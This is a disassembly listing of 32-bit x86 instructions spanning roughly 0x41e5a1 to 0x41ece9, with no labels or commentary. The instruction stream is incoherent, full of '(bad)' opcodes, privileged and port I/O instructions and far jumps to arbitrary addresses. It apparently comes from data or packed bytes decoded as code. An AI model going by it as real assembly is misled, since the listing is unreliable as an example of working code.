  41e5a1:	sbb    esp,0xe47762ca
  41e5a7:	test   al,0x11
  41e5a9:	sub    bh,BYTE PTR [edi+0x5d51605c]
  41e5af:	clc    
  41e5b0:	jne    0x41e622
  41e5b2:	fist   DWORD PTR [edi+ecx*8]
  41e5b5:	xchg   ecx,eax
  41e5b6:	dec    ebx
  41e5b7:	or     al,0x80
  41e5b9:	inc    ebp
  41e5ba:	rcr    DWORD PTR fs:[esi+0x2b],1
  41e5be:	xchg   esi,eax
  41e5bf:	mov    ds:0x33ea8ef2,eax
  41e5c4:	mov    dh,0x22
  41e5c6:	sub    bl,BYTE PTR [eax+esi*2+0x67]
  41e5ca:	repnz cmc 
  41e5cc:	mov    cl,0x4f
  41e5ce:	cmp    edx,DWORD PTR [ebx]
  41e5d0:	div    BYTE PTR ds:0x84e4ece
  41e5d6:	or     al,ah
  41e5d8:	mov    dh,0x62
  41e5da:	inc    ebx
  41e5db:	adc    BYTE PTR [esp+edx*2],dl
  41e5de:	and    edi,ebp
  41e5e0:	sub    BYTE PTR ds:0x1c936fd,dh
  41e5e6:	fsub   QWORD PTR [edi+esi*1+0xc]
  41e5ea:	lods   al,BYTE PTR ds:[esi]
  41e5eb:	push   ds
  41e5ec:	shr    BYTE PTR [ebx+edx*2+0x5a7273],cl
  41e5f3:	popa   
  41e5f4:	mov    bh,BYTE PTR [ebp-0x31]
  41e5f7:	in     al,dx
  41e5f8:	iret   
  41e5f9:	cmp    bh,BYTE PTR [esi+eax*4]
  41e5fc:	popf   
  41e5fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5fe:	sub    ecx,edx
  41e600:	mov    DWORD PTR [edi],esi
  41e602:	pop    edx
  41e603:	and    dl,BYTE PTR [ecx-0x255bed56]
  41e609:	(bad)
  41e60c:	xor    eax,DWORD PTR [esi]
  41e60e:	into   
  41e60f:	cmp    DWORD PTR [ecx-0x11],ebp
  41e612:	popa   
  41e613:	sahf   
  41e614:	into   
  41e615:	mov    esi,0x5583d263
  41e61a:	add    eax,0xb363ec87
  41e61f:	push   es
  41e620:	test   al,0x48
  41e622:	ins    BYTE PTR es:[edi],dx
  41e623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e624:	push   ecx
  41e625:	daa    
  41e626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e627:	jmp    0x41e60a
  41e629:	popf   
  41e62a:	mov    ecx,0x160cca3c
  41e62f:	and    esp,DWORD PTR [edx+0x21]
  41e632:	aas    
  41e633:	adc    al,al
  41e635:	(bad)  
  41e636:	stos   DWORD PTR es:[edi],eax
  41e637:	jle    0x41e5ee
  41e639:	pop    ds
  41e63a:	mov    eax,ds:0xe25c64aa
  41e63f:	sbb    al,0x8f
  41e641:	ficom  DWORD PTR [eax+ecx*4]
  41e644:	gs mov esi,0xcbecbc47
  41e64a:	or     DWORD PTR [eax-0x3],ebp
  41e64d:	iret   
  41e64e:	xchg   ebx,eax
  41e64f:	jae    0x41e65c
  41e651:	into   
  41e652:	add    bl,BYTE PTR [esi-0x43]
  41e655:	shl    ebx,1
  41e657:	stos   DWORD PTR es:[edi],eax
  41e658:	dec    edi
  41e659:	loope  0x41e6be
  41e65b:	ficom  DWORD PTR [eax]
  41e65d:	in     al,dx
  41e65e:	inc    ebp
  41e65f:	pop    ebx
  41e660:	stos   BYTE PTR es:[edi],al
  41e661:	sub    eax,0x26a6171c
  41e666:	rcr    BYTE PTR [ebx],cl
  41e668:	push   0xffffff9b
  41e66a:	std    
  41e66b:	into   
  41e66c:	jae    0x41e627
  41e66e:	push   es
  41e66f:	sbb    DWORD PTR [ebx+esi*8+0x2c],ebx
  41e673:	repz adc esi,ebx
  41e676:	mov    BYTE PTR [edx],bl
  41e678:	add    eax,0xeb86be23
  41e67d:	mov    edx,0xde0e1afc
  41e682:	xchg   esi,eax
  41e683:	mov    ebx,0xc59e3183
  41e688:	or     bl,al
  41e68a:	cli    
  41e68b:	test   BYTE PTR [edi],cl
  41e68d:	addr16 ja 0x41e68b
  41e690:	ins    DWORD PTR es:[edi],dx
  41e691:	sub    edx,esi
  41e693:	add    BYTE PTR [ebx+0x69133285],bh
  41e699:	into   
  41e69a:	movups XMMWORD PTR [esi-0x7318d46a],xmm3
  41e6a1:	xchg   esi,eax
  41e6a2:	sbb    eax,0x287dcb30
  41e6a7:	das    
  41e6a8:	add    al,0xeb
  41e6aa:	push   ebx
  41e6ab:	add    BYTE PTR [esi+0x21],dh
  41e6ae:	pop    ebx
  41e6af:	fs inc esp
  41e6b1:	pop    ds
  41e6b2:	popf   
  41e6b3:	push   edx
  41e6b4:	push   es
  41e6b5:	xchg   esp,eax
  41e6b6:	sub    al,0x91
  41e6b8:	xor    ebp,esp
  41e6ba:	cld    
  41e6bb:	and    ebx,0x23dffbc5
  41e6c1:	mov    cl,0x97
  41e6c3:	mov    bh,0xbf
  41e6c5:	ss adc ebx,eax
  41e6c8:	arpl   cx,ax
  41e6ca:	or     eax,0xb91a7c67
  41e6cf:	(bad)  
  41e6d0:	sbb    eax,0xc83a6f6c
  41e6d5:	enter  0xe77,0x6d
  41e6d9:	mov    bh,BYTE PTR [esi-0x67]
  41e6dc:	push   0xb6a2b8d1
  41e6e1:	sub    BYTE PTR [eax+0x38],ah
  41e6e4:	cmpxchg BYTE PTR [ebx+0x1b],bh
  41e6e8:	inc    edi
  41e6e9:	adc    cl,BYTE PTR [edx]
  41e6eb:	js     0x41e703
  41e6ed:	cli    
  41e6ee:	or     DWORD PTR [esi-0x1f1a2f12],0x402378fe
  41e6f8:	mov    WORD PTR [eax+0x10],?
  41e6fb:	mov    al,es:0xf80c5e97
  41e701:	xchg   DWORD PTR [ebx],ebp
  41e703:	mov    DWORD PTR [esi],esp
  41e705:	or     ecx,DWORD PTR cs:[edx-0x71f12e7c]
  41e70c:	call   0x83c0d6fb
  41e711:	leave  
  41e712:	inc    ebp
  41e713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e714:	sbb    ah,bh
  41e716:	in     al,dx
  41e717:	outs   dx,BYTE PTR ds:[esi]
  41e718:	nop
  41e719:	mov    dh,0x70
  41e71b:	cmc    
  41e71c:	cmpps  xmm6,XMMWORD PTR [ebx+0x14cfe03a],0xf5
  41e724:	aam    0x29
  41e726:	xor    ah,bh
  41e728:	and    edi,DWORD PTR [eax+ecx*4-0x1721b1b0]
  41e72f:	xchg   ebx,eax
  41e730:	cmp    eax,0x4d5f9773
  41e735:	mov    ds:0xf22c10b6,eax
  41e73a:	pop    esp
  41e73b:	stos   DWORD PTR es:[edi],eax
  41e73c:	dec    edx
  41e73d:	add    al,0x3b
  41e73f:	aaa    
  41e740:	jb     0x41e796
  41e742:	gs cmp eax,0x3062605e
  41e748:	mov    WORD PTR [eax-0x4958a514],gs
  41e74e:	cld    
  41e74f:	add    al,0x33
  41e751:	lds    esi,FWORD PTR [ecx]
  41e753:	das    
  41e754:	ss out 0xdc,eax
  41e757:	inc    ebp
  41e758:	mov    dl,0x9
  41e75a:	pop    esi
  41e75b:	(bad)  
  41e75c:	test   al,0x11
  41e75e:	ret    
  41e75f:	ds cld 
  41e761:	jmp    0x41e71d
  41e763:	inc    edi
  41e764:	stc    
  41e765:	jns    0x41e707
  41e767:	sbb    ah,bh
  41e769:	jne    0x41e7b2
  41e76b:	or     al,0xd2
  41e76d:	lahf   
  41e76e:	outs   dx,DWORD PTR ds:[esi]
  41e76f:	js     0x41e766
  41e771:	sub    DWORD PTR [edx+eax*1+0x6f],edx
  41e775:	mov    cl,0x46
  41e777:	jb     0x41e748
  41e779:	int3   
  41e77a:	imul   eax,DWORD PTR [edi-0x30afa3de],0xffffffac
  41e781:	nop
  41e782:	sub    dl,BYTE PTR [edi-0x1b3bef6e]
  41e788:	add    eax,0x5b81853
  41e78d:	sub    dl,BYTE PTR [ebp-0x2de440d5]
  41e793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e794:	pop    ebp
  41e795:	(bad)  
  41e796:	pop    edi
  41e797:	fsubr  DWORD PTR [edi+0x2c]
  41e79a:	jns    0x41e723
  41e79c:	into   
  41e79d:	bound  esp,QWORD PTR [edx+eiz*1-0x3f]
  41e7a1:	mov    cl,dh
  41e7a3:	inc    ebx
  41e7a4:	sub    BYTE PTR [ebx],ch
  41e7a6:	rcr    DWORD PTR [eax+eax*8+0x9],1
  41e7aa:	add    DWORD PTR [ebx+0x64259664],ebp
  41e7b0:	or     BYTE PTR [ebp+ecx*2-0x511d1512],bh
  41e7b7:	shl    DWORD PTR [ebp+0x2],0xf7
  41e7bb:	xchg   edx,eax
  41e7bc:	push   esi
  41e7bd:	ror    eax,0xa8
  41e7c0:	sub    dh,bh
  41e7c2:	xor    eax,0xf0c2350a
  41e7c7:	outs   dx,BYTE PTR ds:[esi]
  41e7c8:	xor    dl,ah
  41e7ca:	nop
  41e7cb:	iret   
  41e7cc:	inc    ecx
  41e7cd:	fst    DWORD PTR [edx+edi*4]
  41e7d0:	inc    esi
  41e7d1:	push   es
  41e7d2:	push   0x6dac43cb
  41e7d7:	and    al,0xc9
  41e7d9:	data16 adc dl,cl
  41e7dc:	cwde   
  41e7dd:	inc    edi
  41e7de:	adc    bh,BYTE PTR [esi-0x3e]
  41e7e1:	xor    al,0x20
  41e7e3:	lahf   
  41e7e4:	xor    ch,BYTE PTR [ebp-0x6dbf2cff]
  41e7ea:	enter  0xf314,0x69
  41e7ee:	leave  
  41e7ef:	xor    ebp,esp
  41e7f1:	pop    edi
  41e7f2:	sub    eax,0x488896f9
  41e7f7:	sti    
  41e7f8:	ja     0x41e802
  41e7fa:	imul   ebp,DWORD PTR [ebx-0xe],0xb6b19def
  41e801:	or     eax,0xc637b4e9
  41e806:	cwde   
  41e807:	sbb    BYTE PTR [ebx-0x4a82b01c],dl
  41e80d:	mov    WORD PTR [ecx],cs
  41e80f:	jnp    0x41e856
  41e811:	call   0x5c63bb4d
  41e816:	ret    
  41e817:	ins    BYTE PTR es:[edi],dx
  41e818:	jmp    0x41e847
  41e81a:	inc    eax
  41e81b:	cmp    eax,0x44ac084e
  41e820:	jbe    0x41e849
  41e822:	adc    eax,DWORD PTR [esi+0x2f16c092]
  41e828:	fdivr  QWORD PTR [ebx+0x2d]
  41e82b:	vpand  xmm6,xmm7,XMMWORD PTR [ecx]
  41e82f:	dec    ebp
  41e830:	rep outs dx,BYTE PTR ds:[esi]
  41e832:	test   eax,0xec0ef0ea
  41e837:	mov    edi,ebp
  41e839:	push   es
  41e83a:	inc    ebp
  41e83b:	or     ecx,DWORD PTR [esi]
  41e83d:	jb     0x6b0aeabc
  41e843:	mov    DWORD PTR [esi],edx
  41e845:	and    edi,DWORD PTR [ebp-0x69ab2ac6]
  41e84b:	std    
  41e84c:	xlat   BYTE PTR ds:[ebx]
  41e84d:	das    
  41e84e:	jno    0x41e895
  41e850:	out    0xa0,al
  41e852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e853:	lods   al,BYTE PTR ds:[esi]
  41e854:	test   BYTE PTR [edx],al
  41e856:	loope  0x41e832
  41e858:	stos   BYTE PTR es:[edi],al
  41e859:	nop
  41e85a:	clc    
  41e85b:	adc    eax,0x9416bb08
  41e860:	mov    eax,DWORD PTR ds:0x45a8babd
  41e866:	jne    0x41e804
  41e868:	pushf  
  41e869:	jno    0x41e8aa
  41e86b:	push   ebp
  41e86c:	(bad)  
  41e86d:	pop    fs
  41e86f:	pop    ebx
  41e870:	dec    eax
  41e871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e872:	aad    0x55
  41e874:	adc    al,0x91
  41e877:	pusha  
  41e878:	jb     0x41e8a0
  41e87a:	inc    ebp
  41e87b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e87c:	mov    ebp,0xfa876d17
  41e881:	(bad)  
  41e882:	pop    ebp
  41e883:	mov    ah,0x56
  41e885:	xchg   ebx,edi
  41e887:	rcr    DWORD PTR ds:0xb315eff2,cl
  41e88d:	xor    eax,0xe4ed9031
  41e892:	mov    dh,BYTE PTR [edi+0x56d07608]
  41e898:	jl     0x41e8b7
  41e89a:	out    0x3e,al
  41e89c:	sbb    BYTE PTR [eax-0x46d9e7f1],dl
  41e8a2:	xlat   BYTE PTR ds:[ebx]
  41e8a3:	arpl   WORD PTR [edx],bp
  41e8a5:	add    al,0x9b
  41e8a7:	pop    ss
  41e8a8:	inc    ebx
  41e8a9:	jae    0x41e91d
  41e8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ac:	ins    DWORD PTR es:[edi],dx
  41e8ad:	inc    eax
  41e8ae:	pop    ss
  41e8af:	lods   al,BYTE PTR ds:[esi]
  41e8b0:	pop    edi
  41e8b1:	mov    eax,ds:0x60b56960
  41e8b6:	jno    0x41e8eb
  41e8b8:	mov    cl,0x95
  41e8ba:	out    dx,eax
  41e8bb:	jecxz  0x41e931
  41e8bd:	rcr    cl,0xf3
  41e8c0:	inc    esi
  41e8c1:	sbb    DWORD PTR [eax],edi
  41e8c3:	cwde   
  41e8c4:	pusha  
  41e8c5:	rcl    DWORD PTR [edx-0x2d3f057f],cl
  41e8cb:	hlt    
  41e8cc:	inc    eax
  41e8cd:	xchg   ebx,eax
  41e8ce:	push   ebx
  41e8cf:	bound  eax,QWORD PTR [esi+0x21c384b1]
  41e8d5:	cmp    al,0xba
  41e8d7:	out    0x67,al
  41e8d9:	pop    edx
  41e8da:	adc    edi,DWORD PTR ds:0x4b66d547
  41e8e0:	pop    ebx
  41e8e1:	jecxz  0x41e918
  41e8e3:	mov    ebp,DWORD PTR [ebp+0x7d]
  41e8e6:	or     esp,DWORD PTR [ebp-0x3a3f343b]
  41e8ec:	or     edx,esp
  41e8ee:	mov    ebp,0xe84f9659
  41e8f3:	cli    
  41e8f4:	sbb    bl,bl
  41e8f6:	lea    edx,[edi]
  41e8f8:	inc    edx
  41e8f9:	push   ss
  41e8fa:	and    al,0xde
  41e8fc:	jno    0x41e938
  41e8fe:	int3   
  41e8ff:	add    cl,dh
  41e901:	sub    ebp,DWORD PTR [ebp+0x13921369]
  41e907:	repnz call 0x9c43:0x9003d3a3
  41e90f:	test   eax,0x23fad43a
  41e914:	add    DWORD PTR [eax],ebp
  41e916:	adc    BYTE PTR [ebx],bh
  41e918:	sti    
  41e919:	mov    esp,0x47239489
  41e91e:	pop    edx
  41e91f:	inc    ecx
  41e920:	mov    bh,0xcd
  41e922:	leave  
  41e923:	clc    
  41e924:	fld    TBYTE PTR [ecx]
  41e926:	retf   
  41e927:	push   0xc559f94d
  41e92c:	jge    0x41e97d
  41e92e:	push   edx
  41e92f:	lahf   
  41e930:	fcmovnu st,st(1)
  41e932:	push   eax
  41e933:	stos   BYTE PTR es:[edi],al
  41e934:	jns    0x41e8ca
  41e936:	xor    al,0x11
  41e938:	add    al,0x3c
  41e93a:	fs add cl,ah
  41e93d:	add    eax,0x9477d82
  41e942:	dec    edi
  41e943:	or     eax,0x48fbf118
  41e948:	lock xchg ecx,eax
  41e94a:	push   ebx
  41e94b:	in     al,dx
  41e94c:	call   0xdb28fe9e
  41e951:	sbb    DWORD PTR [edi],ebp
  41e953:	xchg   DWORD PTR [eax-0x38],ebp
  41e956:	idiv   DWORD PTR [ebp+0x47]
  41e959:	or     eax,0x1f1f4ccb
  41e95e:	jns    0x41e94d
  41e960:	adc    esi,DWORD PTR [eax-0x67277107]
  41e966:	rol    BYTE PTR [ebp+0x29],cl
  41e969:	push   ss
  41e96a:	in     al,dx
  41e96b:	aaa    
  41e96c:	mov    esp,0xcb9836f8
  41e971:	jmp    0x63745293
  41e976:	pop    ecx
  41e977:	in     eax,dx
  41e978:	lock push 0x5398c817
  41e97e:	dec    esp
  41e97f:	inc    eax
  41e980:	sbb    al,0x30
  41e982:	call   0x25f028a7
  41e987:	arpl   WORD PTR [ecx-0x43466487],dx
  41e98d:	inc    esp
  41e98e:	gs call 0x9286:0x2ee15dc9
  41e996:	clc    
  41e997:	mov    DWORD PTR [eax-0x48fa4a11],eax
  41e99d:	push   0xffffffc0
  41e99f:	sbb    BYTE PTR [ebx-0x47],0xaa
  41e9a3:	and    esi,eax
  41e9a5:	and    BYTE PTR [eax+0x524f3549],dh
  41e9ab:	mov    dl,0x27
  41e9ad:	in     eax,dx
  41e9ae:	push   ebx
  41e9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b0:	and    BYTE PTR [eax+edx*8-0xc361a6a],0x50
  41e9b8:	mov    cl,0xf2
  41e9ba:	ins    DWORD PTR es:[edi],dx
  41e9bb:	pop    ss
  41e9bc:	cmp    eax,0xa75f38d3
  41e9c1:	lock sbb al,0x71
  41e9c4:	(bad)  
  41e9c5:	cmp    dl,BYTE PTR [eax]
  41e9c7:	les    eax,FWORD PTR [edx+edx*1-0x73]
  41e9cb:	div    ah
  41e9cd:	sbb    BYTE PTR [ebp+edi*2+0x70052547],dl
  41e9d4:	int    0x1d
  41e9d6:	iret   
  41e9d7:	inc    eax
  41e9d8:	ja     0x41e96e
  41e9da:	popf   
  41e9db:	and    al,0x94
  41e9dd:	ror    DWORD PTR [ebx-0x3c],cl
  41e9e0:	and    eax,0x9e3f57be
  41e9e5:	jo     0x41e9c9
  41e9e7:	aam    0x61
  41e9e9:	loope  0x41e9ca
  41e9eb:	xor    al,0x45
  41e9ed:	jbe    0x41e99e
  41e9ef:	push   edi
  41e9f0:	jecxz  0x41e9db
  41e9f2:	add    ebx,DWORD PTR [ebx+0x47]
  41e9f5:	icebp  
  41e9f6:	xor    DWORD PTR [eax+0x36],ebp
  41e9f9:	or     BYTE PTR [ecx+0x2d4b0fb8],dl
  41e9ff:	aad    0x81
  41ea01:	push   ecx
  41ea02:	mov    ch,0xa7
  41ea04:	data16 test ah,bl
  41ea07:	mov    esp,0x9d26351f
  41ea0c:	push   es
  41ea0d:	xchg   esp,eax
  41ea0e:	jo     0x41ea15
  41ea10:	push   0x2dd590d3
  41ea15:	or     DWORD PTR [esi-0x141e6f83],edi
  41ea1b:	push   es
  41ea1c:	mov    ch,0x9e
  41ea1e:	xchg   DWORD PTR [ecx-0x2871ef26],ebx
  41ea24:	scas   eax,DWORD PTR es:[edi]
  41ea25:	fild   QWORD PTR [edx+ebx*4+0x94267c4]
  41ea2c:	push   0xfa87f8f0
  41ea31:	inc    esp
  41ea32:	jno    0x41ea11
  41ea34:	inc    edi
  41ea35:	mov    al,0xe7
  41ea37:	sbb    ecx,DWORD PTR [edx-0x6]
  41ea3a:	int    0xdf
  41ea3c:	icebp  
  41ea3d:	push   ss
  41ea3e:	jg     0x41ea49
  41ea40:	adc    al,0xb1
  41ea42:	les    ebx,FWORD PTR [eax]
  41ea44:	loop   0x41eaaa
  41ea46:	dec    edi
  41ea47:	pushf  
  41ea48:	lds    edi,FWORD PTR [ebp+0x73908f36]
  41ea4e:	loope  0x41e9e7
  41ea50:	xor    ebx,ebp
  41ea52:	mov    cl,0xb7
  41ea54:	pop    ebp
  41ea55:	ret    
  41ea56:	addr16 jbe 0x41ea9e
  41ea59:	cdq    
  41ea5a:	lods   eax,DWORD PTR ds:[esi]
  41ea5b:	push   0xebd21685
  41ea60:	in     al,0x44
  41ea62:	lahf   
  41ea63:	fidivr DWORD PTR [ecx-0x3]
  41ea66:	sbb    BYTE PTR [eax+0x3a7f57fc],cl
  41ea6c:	sub    BYTE PTR [ecx-0x7],dh
  41ea6f:	jle    0x41ea82
  41ea71:	cmp    BYTE PTR [ebx+0x7a89146b],dl
  41ea77:	(bad)  [ebx]
  41ea79:	enter  0x325a,0x1f
  41ea7d:	in     eax,dx
  41ea7e:	cmp    dl,BYTE PTR [edi+0x34]
  41ea81:	xchg   esi,eax
  41ea82:	lea    esi,[ebx+0x3]
  41ea85:	not    bh
  41ea87:	sti    
  41ea88:	ret    0xbe67
  41ea8b:	mov    esi,0xc91deb35
  41ea90:	xchg   ecx,eax
  41ea91:	inc    ecx
  41ea92:	jbe    0x41ea76
  41ea94:	sbb    eax,0xd298c4b0
  41ea99:	mov    dh,0x79
  41ea9b:	scas   eax,DWORD PTR es:[edi]
  41ea9c:	imul   esp,DWORD PTR [ebp+0x46],0x1e
  41eaa0:	cdq    
  41eaa1:	pop    ecx
  41eaa2:	inc    ecx
  41eaa3:	stos   BYTE PTR es:[edi],al
  41eaa4:	je     0x41ea7d
  41eaa6:	aam    0x94
  41eaa8:	push   edx
  41eaa9:	shl    bh,cl
  41eaab:	push   ss
  41eaac:	iret   
  41eaad:	stc    
  41eaae:	or     eax,0x8e0c35ed
  41eab3:	adc    BYTE PTR [ecx-0x1c9bb109],0x3f
  41eaba:	adc    eax,0x64e8c77f
  41eabf:	mov    cl,BYTE PTR [ebx+eax*8+0x750f7960]
  41eac6:	add    edx,DWORD PTR [esi]
  41eac8:	mov    al,0x7d
  41eaca:	mov    edi,ecx
  41eacc:	sub    al,0x3
  41eace:	or     eax,0x7f9db755
  41ead3:	ins    BYTE PTR es:[edi],dx
  41ead4:	xchg   DWORD PTR [edx+0x79b42791],eax
  41eada:	(bad)  
  41eadb:	xchg   esi,eax
  41eadc:	test   edi,eax
  41eade:	test   eax,0x625988b7
  41eae3:	pushf  
  41eae4:	or     al,0x58
  41eae6:	sbb    eax,0x41e8726b
  41eaeb:	push   ebp
  41eaec:	(bad)  
  41eaed:	push   ebx
  41eaee:	pop    ds
  41eaef:	test   BYTE PTR [ebp+0xa8e077e],ch
  41eaf5:	push   ecx
  41eaf6:	hlt    
  41eaf7:	int3   
  41eaf8:	paddb  mm2,mm6
  41eafb:	fsincos 
  41eafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eafe:	pop    eax
  41eaff:	cli    
  41eb00:	mov    ds:0x3b1b639f,al
  41eb05:	int3   
  41eb06:	mov    cl,0x6d
  41eb08:	xchg   DWORD PTR [edi-0x490c046b],ecx
  41eb0e:	shl    DWORD PTR [ecx+0x1c],cl
  41eb11:	aaa    
  41eb12:	fisubr WORD PTR [eax-0x39dc6965]
  41eb18:	inc    ebx
  41eb19:	xchg   ecx,eax
  41eb1a:	push   edi
  41eb1b:	iret   
  41eb1c:	mov    cl,0x3a
  41eb1e:	dec    ebp
  41eb1f:	iret   
  41eb20:	inc    edi
  41eb21:	jb     0x41eab3
  41eb23:	dec    ebx
  41eb24:	fsub   DWORD PTR [ecx-0x199f00c0]
  41eb2a:	lds    eax,FWORD PTR [ebx+ebp*1-0x2d]
  41eb2e:	mov    ecx,0xa5979e39
  41eb33:	jae    0x1dd48c4
  41eb39:	xchg   esi,eax
  41eb3a:	ja     0x41eb01
  41eb3c:	mov    ebx,0x5d646000
  41eb41:	or     ah,ah
  41eb43:	push   edi
  41eb44:	mov    BYTE PTR [ebx+0x39],cl
  41eb47:	or     bh,cl
  41eb49:	loop   0x41eb3c
  41eb4b:	and    eax,0xa7ee8bae
  41eb50:	loopne 0x41eb74
  41eb52:	jno    0x41ebcf
  41eb54:	outs   dx,BYTE PTR ds:[esi]
  41eb55:	nop
  41eb56:	addr16 sbb esi,edx
  41eb59:	dec    ebp
  41eb5a:	sub    al,0xe8
  41eb5c:	mov    DWORD PTR [ebp+0x2bbe56ac],edi
  41eb62:	int3   
  41eb63:	jnp    0x41eb42
  41eb65:	cmp    al,ch
  41eb67:	ja     0x41eb0b
  41eb69:	(bad)  
  41eb6a:	inc    eax
  41eb6b:	idiv   dl
  41eb6d:	sub    ebp,DWORD PTR [ebp+0x16]
  41eb70:	(bad)  [ebx]
  41eb72:	lods   al,BYTE PTR ds:[esi]
  41eb73:	dec    edx
  41eb74:	lods   al,BYTE PTR ds:[esi]
  41eb75:	sbb    eax,0x15569874
  41eb7a:	mov    cl,0x4f
  41eb7c:	mov    esp,0x8161f0ff
  41eb81:	jp     0x41eb3b
  41eb83:	pop    esi
  41eb84:	push   edx
  41eb85:	push   cs
  41eb86:	shl    BYTE PTR [edi],0xf1
  41eb89:	fidivr DWORD PTR [edi-0x6e]
  41eb8c:	add    bh,BYTE PTR [ebx+0x2b4ba191]
  41eb92:	push   edi
  41eb93:	xor    al,0x5a
  41eb95:	add    BYTE PTR [ebx],0x41
  41eb98:	jecxz  0x41ebda
  41eb9a:	or     al,0xef
  41eb9c:	cmp    BYTE PTR [ecx+0x560cd821],al
  41eba2:	or     al,0xa0
  41eba4:	scas   al,BYTE PTR es:[edi]
  41eba5:	and    DWORD PTR [ebp+edi*4-0xaca15cf],eax
  41ebac:	pop    edi
  41ebad:	jnp    0x41ec0f
  41ebaf:	xor    DWORD PTR ss:[ecx-0x35],0x3d
  41ebb4:	and    DWORD PTR ds:0xb6237860,edi
  41ebba:	jg     0x41ebd0
  41ebbc:	pop    edi
  41ebbd:	sub    al,0x61
  41ebbf:	fdivr  st(0),st
  41ebc1:	in     eax,dx
  41ebc2:	clc    
  41ebc3:	mov    bh,0xa1
  41ebc5:	lods   al,BYTE PTR ds:[esi]
  41ebc6:	pop    eax
  41ebc7:	jmp    0x4988:0x158bfc70
  41ebce:	stc    
  41ebcf:	xchg   ebx,eax
  41ebd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd1:	adc    BYTE PTR [edx],0x3e
  41ebd4:	mov    BYTE PTR [ecx-0x36],cl
  41ebd7:	push   ecx
  41ebd8:	fdiv   DWORD PTR [ebp-0x21]
  41ebdb:	lds    edx,FWORD PTR [ebx+0x74ecb1cb]
  41ebe1:	pop    eax
  41ebe2:	jge    0x41ec0b
  41ebe4:	adc    ebx,ebx
  41ebe6:	les    esi,FWORD PTR [eax+0x5a]
  41ebe9:	fidivr DWORD PTR [edx-0x59407527]
  41ebef:	das    
  41ebf0:	js     0x41ec6f
  41ebf2:	out    dx,al
  41ebf3:	add    al,0x52
  41ebf5:	retf   0x3842
  41ebf8:	or     ecx,DWORD PTR [edi-0x12]
  41ebfb:	mov    cl,0x3c
  41ebfd:	or     cl,ah
  41ebff:	jbe    0x41ec2b
  41ec01:	adc    al,0x51
  41ec03:	mov    eax,ds:0x76070787
  41ec08:	(bad)  
  41ec0a:	jg     0x41ec33
  41ec0c:	retf   0x8615
  41ec0f:	gs pop ebp
  41ec11:	jns    0x41ebd5
  41ec13:	jl     0x41ebd1
  41ec15:	outs   dx,DWORD PTR ds:[esi]
  41ec16:	fcomp  DWORD PTR [ebp+0x22]
  41ec19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec1a:	xor    bh,dl
  41ec1c:	jb     0x41ec0f
  41ec1e:	cli    
  41ec1f:	imul   esi,DWORD PTR [ebx],0xffffff97
  41ec22:	lods   al,BYTE PTR ds:[esi]
  41ec23:	nop
  41ec24:	nop
  41ec25:	pop    ecx
  41ec26:	pop    edi
  41ec27:	rol    DWORD PTR [ebx+0x45],1
  41ec2a:	sub    eax,0xba0ad0d5
  41ec2f:	xchg   ebx,eax
  41ec30:	or     ebp,ecx
  41ec32:	out    dx,eax
  41ec33:	loopne 0x41ec9d
  41ec35:	pop    ecx
  41ec36:	iret   
  41ec37:	(bad)  
  41ec38:	in     eax,dx
  41ec39:	push   DWORD PTR [edi+0x1027ae5b]
  41ec3f:	jmp    0xa7bb:0xe3463f
  41ec46:	ds pop ebp
  41ec48:	mov    bh,0x18
  41ec4a:	jae    0x41ec69
  41ec4c:	inc    eax
  41ec4d:	and    BYTE PTR [edx+eiz*4-0x80],dl
  41ec51:	or     al,0x2a
  41ec53:	jp     0x41ec87
  41ec55:	lahf   
  41ec56:	mov    ebx,0xab190ee
  41ec5b:	shl    ebx,1
  41ec5d:	(bad)  
  41ec5e:	bound  eax,QWORD PTR [esi+0x5b]
  41ec61:	push   0x8669747a
  41ec66:	aas    
  41ec67:	dec    esp
  41ec68:	sub    al,0x41
  41ec6a:	rdpmc  
  41ec6c:	cmp    al,0xd8
  41ec6e:	mov    eax,ds:0xbd404ff1
  41ec73:	sti    
  41ec74:	cmp    bl,BYTE PTR [ebx+0x2350358d]
  41ec7a:	add    BYTE PTR [ebx+0x56cab3e4],bl
  41ec80:	inc    eax
  41ec81:	mov    ebx,0x8b76165c
  41ec86:	jl     0x41eca0
  41ec88:	lea    ecx,[eax+0x14]
  41ec8b:	stc    
  41ec8c:	aad    0x4a
  41ec8e:	or     esp,DWORD PTR [edi+0x7]
  41ec91:	pop    DWORD PTR [esi-0x49fc261d]
  41ec97:	into   
  41ec98:	les    ebp,FWORD PTR [esi]
  41ec9a:	imul   DWORD PTR [esi+0x21]
  41ec9d:	xor    dl,0x6
  41eca0:	push   ebx
  41eca1:	push   0x18c34e0d
  41eca6:	nop
  41eca7:	jle    0x41ecf5
  41eca9:	xchg   edx,eax
  41ecaa:	xchg   ebp,eax
  41ecab:	out    dx,al
  41ecac:	mov    edx,DWORD PTR [edi+0x36]
  41ecaf:	ss or  ebp,edi
  41ecb2:	jns    0x41ecd6
  41ecb4:	fucomi st,st(5)
  41ecb6:	push   ebx
  41ecb7:	cmp    ch,BYTE PTR [edi]
  41ecb9:	aam    0x81
  41ecbb:	(bad)  
  41ecbc:	sub    al,0xc1
  41ecbe:	push   edi
  41ecbf:	or     eax,0xe5415ff4
  41ecc4:	sahf   
  41ecc5:	cwde   
  41ecc6:	add    ecx,0xe7f76f14
  41eccc:	jmp    0x8da5cef7
  41ecd1:	dec    ebp
  41ecd2:	pushf  
  41ecd3:	sub    al,0xf2
  41ecd5:	push   esp
  41ecd6:	fiadd  WORD PTR [edx-0x45]
  41ecd9:	add    DWORD PTR [ebp+0x594bf375],ebx
  41ecdf:	popf   
  41ece0:	mov    dl,0x55
  41ece2:	pop    ss
  41ece3:	xchg   DWORD PTR [edi+0x7ba09598],esi
  41ece9:	movmskps ebp,xmm5
